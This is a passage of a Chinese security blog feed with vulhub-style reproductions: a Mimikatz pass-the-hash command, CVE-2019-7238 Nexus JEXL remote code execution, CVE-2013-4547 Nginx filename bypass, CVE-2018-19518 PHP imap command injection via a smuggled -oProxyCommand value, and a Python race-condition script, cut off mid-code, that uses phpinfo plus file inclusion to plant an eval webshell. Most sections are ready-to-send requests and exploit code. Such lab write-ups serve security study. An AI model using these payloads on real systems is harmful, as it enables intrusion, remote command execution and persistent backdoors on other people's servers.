/ntlm:ccef208c6485269c20db2cad21734fe7</code></pre><p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 <code>Pass The Hash</code> 已经无法成功，唯独默认的 <code>Administrator</code> (SID 500) 账号例外，利用这个账号仍可以进行 <code>Pass The Hash</code> 远程 <code>ipc</code> 连接。</p><h3 id="域内用户"><a href="#域内用户" class="headerlink" title="域内用户"></a>域内用户</h3><p>前提是：域用户为本地管理组成员</p><pre class=" language-cmd"><code class="language-cmd">sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:ccef208c6485269c20db2cad21734fe7</code></pre><p>域内用户不受补丁影响。</p><h2 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h2><blockquote><p>Changes to this feature include: prevent network logon and remote interactive logon to domain-join ed machine using local accounts…</p></blockquote><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200429143726.png-water_print" alt=""></p><p>安装 <code>KB2871997</code> 补丁后，其他方面并没有太多的变化 。补丁会给本地账号添加一个 <code>S-1-5-113</code> 的 <code>SID</code>，为管理组中的本地账号添加一个 <code>S-1-5-114</code> 的 <code>SID</code>，这样方便通过域策略进行管理，例如从域策略中全面禁止这类账号的网络登录。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\Policies\System\FilterAdministratorToken</code>，系统中一个有 <code>Admin ApprovalMode</code>，<code>UAC</code> 就是通过上面的注册表键值来判断，默认设置为 <code>0</code>。如果设置为 <code>1</code>，则 <code>SID</code> 为 <code>500</code> 的管理员也不能通过网络登录的方式获取高权限。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200429143747.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）</title>
      <link href="/2019/03/05/nexus-repository-manager-3-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/05/nexus-repository-manager-3-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Nexus-Repository-Manager-3-远程命令执行漏洞（CVE-2019-7238）"><a href="#Nexus-Repository-Manager-3-远程命令执行漏洞（CVE-2019-7238）" class="headerlink" title="Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）"></a>Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）</h1><p>Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发 Maven、NuGET 等软件源仓库。其 <code>3.14.0</code> 及之前版本中，存在一处基于 <code>OrientDB</code> 自定义函数的任意 <code>JEXL</code> 表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动 <code>Nexus Repository Manager 3.14.0</code>：</p><pre><code>docker-compose up -d</code></pre><p>等待一段时间环境才能成功启动，访问<a href="http://your-ip:8081" target="_blank" rel="noopener">http://your-ip:8081</a>即可看到 Web 页面。</p><p>使用账号密码 <code>admin:admin123</code> 登录后台，然后在 <code>maven-releases</code> 下随便上传一个jar包：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200326110450.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>接口没有校验权限，所以直接发送如下数据包，即可执行 <code>touch /tmp/success</code> 命令：</p><pre class=" language-http"><code class="language-http">POST /service/extdirect HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">X-Requested-With:</span> XMLHttpRequest<span class="token header-name keyword">Content-Length:</span> 368<span class="token header-name keyword">Connection:</span> close<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"action"</span><span class="token punctuation">:</span><span class="token string">"coreui_Component"</span><span class="token punctuation">,</span><span class="token string">"method"</span><span class="token punctuation">:</span><span class="token string">"previewAssets"</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"page"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"start"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"limit"</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">"sort"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"property"</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"direction"</span><span class="token punctuation">:</span><span class="token string">"ASC"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"filter"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"property"</span><span class="token punctuation">:</span><span class="token string">"repositoryName"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"property"</span><span class="token punctuation">:</span><span class="token string">"expression"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"property"</span><span class="token punctuation">:</span><span class="token string">"type"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"jexl"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"rpc"</span><span class="token punctuation">,</span><span class="token string">"tid"</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">}</span></span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200326110822.png-water_print" alt=""></p><p>可见，<code>/tmp/success</code> 已成功执行：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200326110832.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Nexus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
      <link href="/2019/03/05/nginx-wen-jian-ming-luo-ji-lou-dong/"/>
      <url>/2019/03/05/nginx-wen-jian-ming-luo-ji-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><p>影响版本：Nginx <code>0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</code></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的 URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p><p>举个例子，比如，Nginx 匹配到 <code>.php</code> 结尾的请求，就发送给 <code>fastcgi</code> 进行解析，常见的写法如下：</p><pre><code>location ~ \.php$ {    include        fastcgi_params;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    fastcgi_param  DOCUMENT_ROOT /var/www/html;}</code></pre><p>正常情况下（关闭 <code>pathinfo</code> 的情况下），只有 <code>.php</code> 后缀的文件才会被发送给 <code>fastcgi</code> 解析。</p><p>而存在 <code>CVE-2013-4547</code> 的情况下，我们请求 <code>1.gif[0x20][0x00].php</code>，这个 URI 可以匹配上正则 <code>\.php$</code>，可以进入这个 Location 块；但进入后，Nginx 却错误地认为请求的文件是 <code>1.gif[0x20]</code>，就设置其为 <code>SCRIPT_FILENAME</code> 的值发送给 <code>fastcgi</code>。</p><p>fastcgi 根据 <code>SCRIPT_FILENAME</code> 的值进行解析，最后造成了解析漏洞。</p><p>所以，我们只需要上传一个空格结尾的文件，即可使 PHP 解析之。</p><p>再举个例子，比如很多网站限制了允许访问后台的IP：</p><pre><code>location /admin/ {    allow 127.0.0.1;    deny all;}</code></pre><p>我们可以请求如下 URI：<code>/test[0x20]/../admin/index.php</code>，这个 URI 不会匹配上 location 后面的 <code>/admin/</code>，也就绕过了其中的IP验证；但最后请求的是 <code>/test[0x20]/../admin/index.php</code> 文件，也就是 <code>/admin/index.php</code>，成功访问到后台。<br>（这个前提是需要有一个目录叫 <code>test</code>：这是 Linux 系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误， Windows 下没有这个限制）</p><p>环境启动后，访问 <a href="http://your-ip:8080/" target="_blank" rel="noopener">http://your-ip:8080/</a>即可看到一个上传页面。</p><p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用 <code>CVE-2013-4547</code>。我们上传一个 <code>1.gif</code>，注意后面的空格：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200326101010.png-water_print" alt=""></p><p>访问 <a href="http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php" target="_blank" rel="noopener">http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php</a>，即可发现 <code>PHP</code> 已被解析：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200326101132.png-water_print" alt=""></p><p>注意，[0x20]是空格，[0x00]是 <code>\0</code>，这两个字符都不需要编码。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP imap 远程命令执行漏洞（CVE-2018-19518）</title>
      <link href="/2019/03/04/php-imap-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/04/php-imap-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-imap-远程命令执行漏洞（CVE-2018-19518）"><a href="#PHP-imap-远程命令执行漏洞（CVE-2018-19518）" class="headerlink" title="PHP imap 远程命令执行漏洞（CVE-2018-19518）"></a>PHP imap 远程命令执行漏洞（CVE-2018-19518）</h1><p>php <code>imap</code> 扩展用于在 PHP 中执行邮件收发操作。其 <code>imap_open</code> 函数会调用 <code>rsh</code> 来连接远程 shell，而 <code>debian/ubuntu</code> 中默认使用 ssh 来代替 rsh 的功能（也就是说，在 debian 系列系统中，执行 rsh 命令实际执行的是 ssh 命令）。</p><p>因为 ssh 命令中可以通过设置 <code>-oProxyCommand=</code> 来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送如下数据包即可成功执行命 <code>echo '1234567890'&gt;/tmp/test0001</code>：</p><pre class=" language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 125hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&amp;username=111&amp;password=222</code></pre><p>执行 <code>docker-compose exec web bash</code> 进入容器，可见 <code>/tmp/test0001</code> 已成功创建：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324112201.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含漏洞（利用phpinfo）</title>
      <link href="/2019/03/04/php-wen-jian-bao-han-lou-dong/"/>
      <url>/2019/03/04/php-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP文件包含漏洞（利用phpinfo）"><a href="#PHP文件包含漏洞（利用phpinfo）" class="headerlink" title="PHP文件包含漏洞（利用phpinfo）"></a>PHP文件包含漏洞（利用phpinfo）</h1><p>PHP 文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来 getshell。因为临时文件名是随机的，如果目标网站上存在 phpinfo，则可以通过 phpinfo 来获取临时文件名，进而进行包含。</p><p>环境启动后，访问 <code>http://your-ip:8080/phpinfo.php</code> 即可看到一个 <code>PHPINFO</code> 页面，访问 <code>http://your-ip:8080/lfi.php?file=/etc/passwd</code> ，可见的确存在文件包含漏洞。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在给 PHP 发送 POST 数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP 都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在 <code>\$_FILES</code> 变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为 phpinfo 页面会将当前请求上下文中所有变量都打印出来，所以我们如果向 phpinfo 页面发送包含文件区块的数据包，则即可在返回包里找到 <code>\$_FILES</code> 变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和 phpinfo 页面通常是两个页面，理论上我们需要先发送数据包给 phpinfo 页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><ol><li>发送包含了 webshell 的上传数据包给 phpinfo 页面，这个数据包的 header、get 等位置需要塞满垃圾数据</li><li>因为 phpinfo 页面会将所有数据都打印出来，1 中的垃圾数据会将整个 phpinfo 页面撑得非常大</li><li>php默认的输出缓冲区大小为 4096，可以理解为 php 每次返回 4096 个字节给 socket 连接</li><li>所以，我们直接操作原生 socket，每次读取 4096 个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li><li>此时，第一个数据包的 socket 连接实际上还没结束，因为php还在继续每次输出 4096 个字节，所以临时文件此时还没有删除</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终 getshell</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用脚本 <code>exp.py</code> 实现了上述过程，成功包含临时文件后，会执行<code>&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;</code>，写入一个新的文件<code>/tmp/g</code>，这个文件就会永久留在目标机器上。</p><p>用 <code>python2</code> 执行：<code>python exp.py your-ip 8080 100</code>：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python </span><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?>')?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="dummyname"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /phpinfo.php?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#modify this to suit the LFI script   </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""GET /lfi.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r"""</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> len<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> None    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it! Shell created in /tmp/g"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment" spellcheck="true"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token 